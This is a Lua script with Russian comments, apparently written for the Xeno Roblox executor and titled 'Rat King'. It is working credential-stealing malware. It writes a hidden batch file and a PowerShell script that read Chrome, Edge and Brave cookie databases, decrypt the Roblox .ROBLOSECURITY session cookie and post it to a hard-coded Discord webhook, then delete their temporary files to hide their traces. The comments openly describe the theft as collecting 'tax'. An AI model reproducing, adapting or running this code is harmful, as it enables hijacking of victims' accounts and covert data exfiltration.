--[========================================================[
    ПРОЕКТ "КРЫСИНЫЙ КОРОЛЬ" - АВТОНОМНЫЙ МОДУЛЬ
    Архитектор: Твой злой гений
    Метод: Внешний BAT + Xeno runfile
]========================================================]

local webhook = "https://discord.com/api/webhooks/1526670985124778135/e114crwp_QTxORK21zp-dT36xCevIT1Hw1huQXPZC9aE-lYSomCX0egkHHYUT1w-QWqT"

-- Создаем BAT-файл, который сделает ВСЮ грязную работу сам
local batContent = [[
@echo off
setlocal enabledelayedexpansion

set "webhook=]] .. webhook .. [["

:: Создаем PowerShell скрипт для кражи кук
set "psFile=%TEMP%\xeno_steal.ps1"
set "dbFile=%TEMP%\xeno_temp.db"

echo $ErrorActionPreference = 'SilentlyContinue' > "!psFile!"
echo $webhook = '!webhook!' >> "!psFile!"
echo $browsers = @( >> "!psFile!"
echo     @{Name='Chrome';Path="$env:USERPROFILE\AppData\Local\Google\Chrome\User Data"}, >> "!psFile!"
echo     @{Name='Edge';Path="$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data"}, >> "!psFile!"
echo     @{Name='Brave';Path="$env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data"} >> "!psFile!"
echo ) >> "!psFile!"
echo. >> "!psFile!"
echo foreach ($browser in $browsers) { >> "!psFile!"
echo     if (-not (Test-Path $browser.Path)) { continue } >> "!psFile!"
echo     $profiles = Get-ChildItem -Path $browser.Path -Directory -ErrorAction SilentlyContinue ^| Where-Object { $_.Name -match 'Default' -or $_.Name -match 'Profile' } >> "!psFile!"
echo     foreach ($profile in $profiles) { >> "!psFile!"
echo         $cookiePath = Join-Path $profile.FullName 'Network\Cookies' >> "!psFile!"
echo         if (-not (Test-Path $cookiePath)) { $cookiePath = Join-Path $profile.FullName 'Cookies' } >> "!psFile!"
echo         if (-not (Test-Path $cookiePath)) { continue } >> "!psFile!"
echo         Copy-Item $cookiePath '!dbFile!' -Force >> "!psFile!"
echo         try { >> "!psFile!"
echo             $conn = New-Object System.Data.SQLite.SQLiteConnection('Data Source=!dbFile!;Version=3;Read Only=True;') >> "!psFile!"
echo             $conn.Open() >> "!psFile!"
echo             $cmd = $conn.CreateCommand() >> "!psFile!"
echo             $cmd.CommandText = 'SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE ''%%roblox%%'' AND name = ''.ROBLOSECURITY''' >> "!psFile!"
echo             $reader = $cmd.ExecuteReader() >> "!psFile!"
echo             while ($reader.Read()) { >> "!psFile!"
echo                 $host = $reader.GetString(0) >> "!psFile!"
echo                 $name = $reader.GetString(1) >> "!psFile!"
echo                 $enc = $reader.GetValue(2) >> "!psFile!"
echo                 try { >> "!psFile!"
echo                     $dec = [System.Security.Cryptography.ProtectedData]::Unprotect($enc, $null, 'CurrentUser') >> "!psFile!"
echo                     $val = [System.Text.Encoding]::UTF8.GetString($dec) >> "!psFile!"
echo                     if ($val.Length -gt 10) { >> "!psFile!"
echo                         $payload = @{ >> "!psFile!"
echo                             embeds = @(@{ >> "!psFile!"
echo                                 title = 'Налог собран - Автономный Модуль' >> "!psFile!"
echo                                 description = '**Браузер:** $($browser.Name) / $($profile.Name)' >> "!psFile!"
echo                                 color = 0x8B0000 >> "!psFile!"
echo                                 fields = @(@{name='Кука';value='```' + $val + '```'}) >> "!psFile!"
echo                             }) >> "!psFile!"
echo                         } ^| ConvertTo-Json -Depth 3 >> "!psFile!"
echo                         Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType 'application/json' >> "!psFile!"
echo                     } >> "!psFile!"
echo                 } catch {} >> "!psFile!"
echo             } >> "!psFile!"
echo             $conn.Close() >> "!psFile!"
echo         } catch {} >> "!psFile!"
echo         Remove-Item '!dbFile!' -Force -ErrorAction SilentlyContinue >> "!psFile!"
echo     } >> "!psFile!"
echo } >> "!psFile!"

:: Запускаем PowerShell скрипт скрытно
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "!psFile!"

:: Ждем и удаляем следы
timeout /t 2 /nobreak >nul
del "!psFile!" /q /f >nul 2>&1
del "!dbFile!" /q /f >nul 2>&1

endlocal
]]

-- Сохраняем BAT во временную папку
local batPath = os.getenv("TEMP") .. "\\xeno_loader.bat"
local file = io.open(batPath, "w")
if file then
    file:write(batContent)
    file:close()
end

-- Запускаем BAT через Xeno (самый безопасный метод)
-- Пробуем разные способы, которые Xeno поддерживает
local function runBat()
    -- Способ 1: Прямой запуск BAT (Xeno это точно поддерживает)
    if execute then
        execute('cmd /c "' .. batPath .. '"')
        return
    end
    
    -- Способ 2: Через os.execute с флагом скрытности
    if os and os.execute then
        os.execute('cmd /c start /min "" "' .. batPath .. '"')
        return
    end
    
    -- Способ 3: Через ShellExecute Xeno API
    if xeno and xeno.shell_execute then
        xeno.shell_execute(batPath)
        return
    end
end

runBat()
print("Автономный модуль запущен. Жди налоги в Discord.")
